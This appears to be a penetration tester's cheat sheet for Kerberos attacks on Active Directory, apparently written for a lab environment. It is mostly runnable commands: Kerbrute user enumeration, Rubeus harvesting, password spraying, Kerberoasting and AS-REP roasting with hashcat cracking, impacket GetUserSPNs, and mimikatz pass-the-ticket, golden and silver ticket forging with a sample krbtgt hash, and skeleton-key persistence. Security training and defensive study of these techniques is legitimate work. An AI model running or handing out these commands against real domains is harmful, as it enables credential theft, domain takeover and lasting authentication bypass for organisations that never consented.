## Kerbrute
Used to enumerate active directory users with kerberos pre-authentication.
https://github.com/ropnop/kerbrute/releases
Command for enumerating user using dictionary:
`./kerbrute userenum --dc DOMAIN_CONTROLLER -d DOMAIN_NAME User.txt`

## Rubeus
Rubeus is a powerful tool for attacking Kerberos.Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.
https://github.com/GhostPack/Rubeus
Rubeus must be installed on the target machine to works
### Harvesting tickets
Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.
The syntax:
`Rubeus.exe harvest /interval:30`
This will harvest TGT every 30 seconds

### Brute-Force/Password Spraying
Don't forget to add the IP of the domain controller to the host file
`echo 10.10.168.43 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

Syntax for password spraying:
`Rubeus.exe brute /password:Password1 /noticket`

### Kerberoasting
As a kerberos domain user, request a service ticket for any service with an SPN then use the ticket to crack the service password.
`Rubeus.exe kerberoast`
`hashcat -m 13100 -a 0 hash.txt Pass.txt`

### Kerberoasting using impacket
With impacket 0.9.19: https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19 installed
```bash
cd /usr/share/doc/python3-impacket/examples/
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.168.43 -request

```
The advantage of using impacket is that you don't need to be in the target machine.

### AS-REP Roasting
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.
`Rubeus.exe asreproast`
Insert 23$ after \$krb5asrep\$ so that the first line will be \$krb5asrep\$23\$User.....
`hashcat -m 18200 hash.txt Pass.txt`

## mimikatz
Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network

mimikatz also need to be installed/placed in the target active directory network.

### Pass the ticket
First mimikatz will dump the TGT from the LSASS memory of the machine.
It will give a .kirbi ticket that can be used to gain domain admin if the domain admin ticket is in the LSASS memory. The ticket used to impersonate that account ticket owner.

First dump the ticket:
```shell
mimikatz.exe
sekurlsa::ticket /export
```
this will dump all ticket and save it in the current directory

Then the PTT:
```shell
mimikatz.exe
kerberos::ptt <ticket>
klist   # in cmd/out of mimikatz, check if the ptt is successfull
```

### Golden/Silver ticket
a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

In mimikatz:
`lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

Then:
`kerberos::golden /user:administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500`
Where sid is located in the domain field and krbtgt is the NTLM hash field from the previous command. The id 500 for golden ticket, while 1103 is for silver ticket

### skeleton key
Skeleton keys is basically setting up a rootkit to bypass authentication, placing the defined key, mimikatz by default, to be used for any active directory user.
```bash
mimikatz.exe
privilege::debug
misc::skeleton
```
Then you can access anythin in the forest with:
`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
or `dir \\Desktop-1\c$ /user:Machine1 mimikatz`
